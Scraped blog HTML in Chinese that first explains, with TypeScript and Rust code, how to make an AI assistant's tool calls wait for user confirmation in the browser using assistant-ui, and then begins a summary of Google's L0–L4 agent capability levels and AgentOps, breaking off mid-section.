<h3 data-id="heading-4">核心概念：前端工具 vs 后端工具</h3>

























<table><thead><tr><th/><th>前端工具</th><th>后端工具</th></tr></thead><tbody><tr><td>执行位置</td><td>浏览器</td><td>服务器</td></tr><tr><td>能否与用户交互</td><td>✅ 可以</td><td>❌ 不行</td></tr><tr><td>适用场景</td><td>需要确认的操作</td><td>查询、计算</td></tr></tbody></table>
<p>前端工具的精髓在于：<strong>工具定义发给 AI，但执行在前端</strong>。</p>
<p>AI 知道有这个工具可以用，当它决定调用时，前端拦截执行，可以弹个确认框、让用户填个表单，用户操作完再把结果告诉 AI。</p>
<h3 data-id="heading-5">实现步骤</h3>
<h4 data-id="heading-6">1. 定义工具参数</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// schema.ts</span>
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"名称"</span>),
  <span class="hljs-attr">amount</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"数量"</span>),
});
</code></pre>
<h4 data-id="heading-7">2. 创建前端工具</h4>
<p>这是最关键的部分，使用 <code>makeAssistantTool</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { makeAssistantTool } <span class="hljs-keyword">from</span> <span class="hljs-string">"@assistant-ui/react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordTool</span> = <span class="hljs-title function_">makeAssistantTool</span>({
  <span class="hljs-attr">toolName</span>: <span class="hljs-string">"create-record"</span>,
  <span class="hljs-attr">type</span>: <span class="hljs-string">"frontend"</span>,  <span class="hljs-comment">// 🔑 关键：标记为前端工具</span>
  <span class="hljs-attr">parameters</span>: <span class="hljs-title class_">CreateRecordSchema</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"创建记录"</span>,

  <span class="hljs-comment">// execute 在前端执行</span>
  <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> (args, ctx) =&gt; {
    <span class="hljs-keyword">const</span> { human } = ctx;

    <span class="hljs-comment">// human() 会暂停执行，等待用户确认</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">human</span>(<span class="hljs-string">"请确认创建记录"</span>);

    <span class="hljs-keyword">if</span> (response === <span class="hljs-string">"confirmed"</span>) {
      <span class="hljs-comment">// 调用实际 API</span>
      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">createRecord</span>(args);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
    }
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span> };
  },

  <span class="hljs-comment">// render 渲染确认 UI</span>
  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">{ args, status, result, resume }</span>) =&gt;</span> {
    <span class="hljs-comment">// 等待确认状态</span>
    <span class="hljs-keyword">if</span> (status.<span class="hljs-property">type</span> === <span class="hljs-string">"requires-action"</span>) {
      <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"rounded-lg border p-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>确认创建记录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>名称: {args.name} | 数量: {args.amount}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("confirmed")}&gt;确认<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("cancelled")}&gt;取消<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
      );
    }

    <span class="hljs-comment">// 完成状态</span>
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{result?.success ? "✅" : "❌"} 已处理<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  },
});
</code></pre>
<p><strong>核心 API 解释：</strong></p>
<ul>
<li><code>human(message)</code>: 暂停执行，等待用户操作</li>
<li><code>resume(value)</code>: 用户操作后恢复执行，value 会作为 <code>human()</code> 的返回值</li>
</ul>
<h4 data-id="heading-8">3. 注册工具</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

  <span class="hljs-keyword">const</span> runtime = <span class="hljs-title function_">useChatRuntime</span>({
    <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantChatTransport</span>({
      <span class="hljs-attr">api</span>: <span class="hljs-string">"/api/chat"</span>,
    }),
    <span class="hljs-comment">// 工具完成后自动发送结果给后端</span>
    <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">lastAssistantMessageIsCompleteWithToolCalls</span>(options)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
      <span class="hljs-keyword">const</span> lastMsg = options.<span class="hljs-property">messages</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> toolPart = lastMsg?.<span class="hljs-property">parts</span>.<span class="hljs-title function_">find</span>(
        <span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">"tool-create-record"</span> &amp;&amp; p.<span class="hljs-property">state</span> === <span class="hljs-string">"output-available"</span>
      ) <span class="hljs-keyword">as</span> { <span class="hljs-attr">toolCallId</span>: <span class="hljs-built_in">string</span> } | <span class="hljs-literal">undefined</span>;

      <span class="hljs-keyword">if</span> (toolPart &amp;&amp; !processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolPart.<span class="hljs-property">toolCallId</span>)) {
        processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolPart.<span class="hljs-property">toolCallId</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    },
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AssistantRuntimeProvider</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">{runtime}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Thread</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">CreateRecordTool</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">AssistantRuntimeProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">4. 后端接收工具定义</h4>
<p>前端会把工具定义发给后端，后端需要转发给 AI：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Rust 后端</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">pub</span> name: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> description: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> parameters: Value,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ToolDyn</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> { <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>() }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">definition</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> ToolDefinition {
        ToolDefinition {
            name: <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>(),
            description: <span class="hljs-keyword">self</span>.description.<span class="hljs-title function_ invoke__">clone</span>(),
            parameters: <span class="hljs-keyword">self</span>.parameters.<span class="hljs-title function_ invoke__">clone</span>(),
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">call</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, ToolError&gt; {
        <span class="hljs-comment">// 前端工具不在后端执行！</span>
        <span class="hljs-title function_ invoke__">Err</span>(ToolError::<span class="hljs-title function_ invoke__">ToolCallError</span>(<span class="hljs-string">"Frontend tool"</span>.<span class="hljs-title function_ invoke__">into</span>()))
    }
}
</code></pre>
<h3 data-id="heading-10">完整流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 用户
    participant 前端
    participant 后端
    participant AI

    用户-&gt;&gt;前端: "创建工单，数量 50"
    前端-&gt;&gt;后端: 发送消息 + 工具定义
    后端-&gt;&gt;AI: 转发
    AI-&gt;&gt;后端: 调用 create-record
    后端--&gt;&gt;前端: 返回工具调用
    前端-&gt;&gt;前端: execute() → human()
    前端-&gt;&gt;用户: 显示确认框
    用户-&gt;&gt;前端: 点击确认
    前端-&gt;&gt;前端: resume("confirmed")
    前端-&gt;&gt;后端: 发送工具结果
    后端-&gt;&gt;AI: 转发结果
    AI-&gt;&gt;后端: "好的，已记录"
    后端--&gt;&gt;前端: 返回回复
    前端-&gt;&gt;用户: 显示完成
</code></pre>
<h3 data-id="heading-11">踩坑记录</h3>
<h4 data-id="heading-12">坑 1：<code>Tool call is not waiting for human input</code></h4>
<p><strong>原因</strong>：没在 <code>execute</code> 里调用 <code>human()</code>，或者在错误状态下调用了 <code>resume()</code></p>
<p><strong>解决</strong>：确保 <code>execute</code> 里有 <code>await human()</code>，且只在 <code>status.type === "requires-action"</code> 时调用 <code>resume()</code></p>
<h4 data-id="heading-13">坑 2：工具完成后消息无限发送</h4>
<p><strong>原因</strong>：<code>sendAutomaticallyWhen</code> 对同一个工具调用重复返回 <code>true</code></p>
<p><strong>解决</strong>：用 <code>useRef</code> 记录已处理的 <code>toolCallId</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

<span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
  <span class="hljs-comment">// ... 找到完成的工具调用</span>
  <span class="hljs-keyword">if</span> (!processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolCallId)) {
    processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolCallId);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-14">坑 3：用错了 <code>makeAssistantToolUI</code></h4>
<p><code>makeAssistantToolUI</code> 只渲染 UI，不会把工具定义发给后端。如果需要 AI 能调用，必须用 <code>makeAssistantTool</code>。</p>
<h3 data-id="heading-15">总结</h3>
<p>通过 <code>assistant-ui</code> 的前端工具机制，我们实现了：</p>
<ol>
<li><strong>AI 能力不打折</strong>：AI 仍然可以决定何时调用工具</li>
<li><strong>用户有控制权</strong>：敏感操作必须经过用户确认</li>
<li><strong>体验很自然</strong>：确认框嵌入在对话流中，不突兀</li>
</ol>
<p>这套方案已经在生产环境稳定运行，用户再也不用担心 AI "手滑"了 😄</p>
<hr/>
<p><strong>技术栈</strong>：React + Rust + Tauri + assistant-ui</p>
<p>如果你也在做 AI 应用，需要人机协作的场景，希望这篇文章对你有帮助！</p>
<p>欢迎评论区交流 👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Google Agent进化论：从 L0 到 L4]]></title>    <link>https://juejin.cn/post/7597276695403102249</link>    <guid>https://juejin.cn/post/7597276695403102249</guid>    <pubDate>2026-01-20T12:09:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403102249" data-draft-id="7597276695403085865" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Google Agent进化论：从 L0 到 L4"/> <meta itemprop="keywords" content="Agent,Google,AIGC"/> <meta itemprop="datePublished" content="2026-01-20T12:09:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="奇舞精选"/> <meta itemprop="url" content="https://juejin.cn/user/4388906147515367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Google Agent进化论：从 L0 到 L4
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4388906147515367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    奇舞精选
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:09:01.000Z" title="Tue Jan 20 2026 12:09:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在人工智能的演进历程中，我们正经历从“预测型 AI”向 <strong>“自主 Agent（Autonomous Agents）”</strong> 的历史性跨越。过去的 AI 更像是被动的响应者，局限于回答问题或生成内容；而现在的 Agent 则是一个拥有感知、决策与执行能力的完整系统，能够主动思考、调用工具并闭环完成复杂任务。</p>
<p>为了帮助开发者和产品决策者厘清这一新物种的技术路径，Google 团队发布了权威指南 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fresources%2Fcontent%2Fai-agent-handbook" target="_blank" title="https://cloud.google.com/resources/content/ai-agent-handbook" ref="nofollow noopener noreferrer">Introduction to Agents</a></strong>，将 Agent 的能力划分为 L0 至 L4 五个层级。</p>
<h2 data-id="heading-0">一、 Agent 的解剖学架构：模型、工具与编排</h2>
<pre><code class="hljs language-markdown" lang="markdown">要理解 Agent 的能力分级，首先需要拆解其核心架构。Google 将一个标准的 Agent 系统定义为四个核心组件的有机结合：

<span class="hljs-bullet">1.</span>  <span class="hljs-strong">**大脑 (The Model)：**</span> 核心推理引擎。它负责信息处理、选项评估及最终决策。模型的推理能力直接决定了 Agent 的智商上限。
<span class="hljs-bullet">2.</span>  <span class="hljs-strong">**双手 (The Tools)：**</span> 连接数字与物理世界的桥梁。通过工具，Agent 可以访问日历、发送邮件、检索数据库或执行代码。没有工具，Agent 仅仅是一个与世隔绝的聊天机器人。
<span class="hljs-bullet">3.</span>  <span class="hljs-strong">**神经系统 (The Orchestration)：**</span> 编排层，即 Agent 的“管家”。它负责管理 <span class="hljs-strong">**思维链 (Chain of Thought)**</span>、维护 <span class="hljs-strong">**状态记忆 (State)**</span>，并决定何时调用何种工具。它赋予了 AI 连贯的逻辑与“短期记忆”能力。
<span class="hljs-bullet">4.</span>  <span class="hljs-strong">**躯体 (Deployment)：**</span> 部署环境。这不仅指服务器基础设施，还包含让 Agent 能被用户交互、或被其他 Agent 调用的运行时接口。
</code></pre>
<h2 data-id="heading-1">二、 Agent 的工作机制：认知-行动闭环</h2>
<p>Agent 解决问题的过程并非单次推理，而是一个包含“观察-思考-修正”的递归闭环。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8be402dbabb74cd9b64d053d59173e2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=WiqU2Uz0jbG1sNYI67naTvSnS3E%3D" alt="image-20260105171602090" loading="lazy"/></p>
<p><strong>图 1：智能体解决问题的漏斗模型</strong></p>
<p>这一循环通常包含五个关键步骤：</p>
<ol>
<li><strong>接收使命 (Get the Mission)：</strong> 接收高层级的模糊目标，例如：“帮我安排团队下周的参会行程”。</li>
<li><strong>扫描环境 (Scan the Scene)：</strong> 获取上下文信息。Agent 会检索记忆（“用户之前的偏好是什么？”）并检查可用资源（“我有差旅系统的权限吗？”）。</li>
<li><strong>深度规划 (Think It Through)：</strong> 制定多步骤执行计划。例如：先提取参会名单 -&gt; 再核对日历空档 -&gt; 最后根据预算限制预订机票。</li>
<li><strong>采取行动 (Take Action)：</strong> 执行具体操作。调用 API 查询数据库、读取文档或发送确认邮件。</li>
<li><strong>观察与迭代 (Observe and Iterate)：</strong> 验证执行结果。如果订票失败，Agent 会分析错误日志，修正参数并重新生成计划，直到闭环完成。</li>
</ol>
<h2 data-id="heading-2">三、 Agent 能力分级：从孤岛到自进化</h2>
<p>基于自主权（Autonomy）与协作能力（Collaboration）的强弱，Google 将 Agent 的进化路径划分为五层金字塔：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a929d3f9fef44a5baf68ff67edb5d04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=5yEAlf3tAPiqNr6iM96R2rmYj64%3D" alt="image-20260105171647579" loading="lazy"/></p>
<p><strong>图 2：智能体解决问题的漏斗模型</strong></p>
<h4 data-id="heading-3">Level 0：核心推理系统 (Core Reasoning System)</h4>
<p>这是 Agent 的雏形，本质上是一个无外接能力的“裸模型”。</p>
<ul>
<li><strong>特点：</strong> 仅依赖预训练数据（Pre-trained Knowledge）进行问答，无外部工具连接，无长期状态记忆。</li>
<li><strong>局限：</strong> 处于“盲目”状态。它可以背诵棒球规则，但如果你问“昨晚洋基队的比分是多少？”，它会因无法联网而产生幻觉或表示无能为力。</li>
</ul>
<h4 data-id="heading-4">Level 1：互联型问题解决者 (Connected Problem-Solver)</h4>
<p>当“大脑”接驳了“双手”，真正的 Agent 诞生了。</p>
<ul>
<li><strong>特点：</strong> 具备 <strong>工具调用 (Tool Use)</strong> 能力。</li>
<li><strong>表现：</strong> 面对比分查询，它会判断“需要检索实时信息”，随即调用 Google Search API，获取结果并整合成答案。它能读取实时文档、查询数据库，打破了训练数据的时空限制。</li>
</ul>
<h4 data-id="heading-5">Level 2：策略型问题解决者 (Strategic Problem-Solver)</h4>
<p>L2 实现了从“被动执行”到“主动规划”的质变。</p>
<ul>
<li><strong>核心能力：</strong> 具备 <strong>上下文工程 (Context Engineering)</strong> 与推理规划能力。它能管理注意力焦点，处理复杂的多步骤任务。</li>
<li><strong>场景：</strong> “在公司和客户办事处之间找一家 4 星以上的咖啡馆”。Agent 会自动拆解任务：计算地理中点（调用地图）-&gt; 搜索周边店铺（调用本地搜索）-&gt; 筛选评分 -&gt; 输出建议。</li>
</ul>
<h4 data-id="heading-6">Level 3：协作式多 Agent 系统 (Collaborative Multi-Agent)</h4>
<p>此时，Agent 不再单打独斗，而是演化为“专家团队”。</p>
<ul>
<li><strong>特点：</strong> Agent 将其他 Agent 视为工具进行调度。</li>
<li><strong>架构：</strong> 类似企业组织架构。一个“项目经理 Agent”接收任务，将其拆解并分发给“市场专家 Agent”、“文案 Agent”和“前端开发 Agent”。例如新品发布任务，各子 Agent 分别负责调研、撰稿和页面搭建，最后由主 Agent 验收整合。</li>
</ul>
<h4 data-id="heading-7">Level 4：自我进化系统 (Self-Evolving System)</h4>
<p>这是目前 Agent 进化的巅峰：具备 <strong>元认知 (Metacognition)</strong> 与自我构建能力。</p>
<ul>
<li><strong>特点：</strong> 当现有工具或团队无法满足需求时，它能自主构建新的工具或 Agent。</li>
<li><strong>表现：</strong> 项目经理 Agent 发现缺乏情感分析能力，它会调用“Agent Creator”工具，现场编写提示词与逻辑，生成一个“舆情分析专家 Agent”，经过自动化测试验证后，将其纳入团队投入生产。</li>
</ul>
<h2 data-id="heading-8">四、 开发范式转移：从“搬砖工”到“导演”</h2>
<p>在 Agent 时代，开发者的角色发生了根本性转变。过去，开发者是“搬砖工（Bricklayer）”，需要硬编码每一行逻辑；现在，开发者更像是 <strong>“导演（Director）”</strong>。</p>
<p><strong>导演的核心职责：</strong></p>
<ul>
<li><strong>设定剧本：</strong> 编写核心系统提示词（System Prompt）和行为宪法。</li>
<li><strong>选角：</strong> 为 Agent 配置最合适的工具集（Tools）和 API 权限。</li>
<li><strong>背景设定：</strong> 注入必要的领域知识库（Knowledge Base）。 剩下的演绎，将交由这个具备自主性的“演员”去动态完成。</li>
</ul>
<h2 data-id="heading-9">五、 AgentOps：构建可信赖的智能系统</h2>
<p>为了让 Agent 在企业环境中稳定运行，我们需要一套类似于 DevOps 的运维体系，称为 <strong>AgentOps</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a92bda61c0e0478d8205d9ebc5a585ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=ETOuJUPk%2F1JWjJu2%2FQJlwd%2FK1ZU%3D" alt="image-20260105171900245" loading="lazy"/></p>
<p><strong>图 3：DevOps、MLOps 与 GenAIOps 的关系</strong></p>
<p>以下是基于来源对 AgentOps 核心组成部分的深度解析：</p>
<ul>
<li>
<ol>
<li>从“通过/失败”到“质量评估（LM Judge）”</li>
</ol>
<p>在传统软件中，测试很简单：输出要么等于预期，要么不等于。但在智能体领域，语言是复杂的，答案往往没有唯一标准。</p>
<p>• <strong>LM 评委 (LM Judge)：</strong> 开发者不再使用简单的单元测试，而是使用一个功能更强大的模型（如 Gemini 2.5 Pro）作为“评委”，按照预定义的准则（如：事实准确性、语气是否得体、是否遵循指令）对智能体的输出进行打分。</p>
<p>• <strong>黄金数据集 (Golden Dataset)：</strong> 为了确保评估的连贯性，需要构建包含理想问题与答案的“黄金数据集”，并由领域专家进行审核。</p>
</li>
<li>
<ol start="2">
<li>指标驱动开发（指标驱动开发）</li>
</ol>
<p>AgentOps 强调<strong>衡量真正重要的业务指标</strong>，而不仅仅是技术指标。</p>
<p>• <strong>KPI 体系：</strong> 评估不仅看回复是否正确，还看任务完成率、用户满意度、单次交互成本以及对业务目标（如收入或留存率）的实际贡献。</p>
<p>• <strong>部署决策 (Go/No-Go)：</strong> 在发布新版本前，通过在整个评估数据集上运行测试，将新旧版本的得分进行直接对比，从而消除猜测，确保每一次迭代都是进步的。</p>
</li>
<li>
<ol start="3">
<li>使用 OpenTelemetry 进行深度调试</li>
</ol>
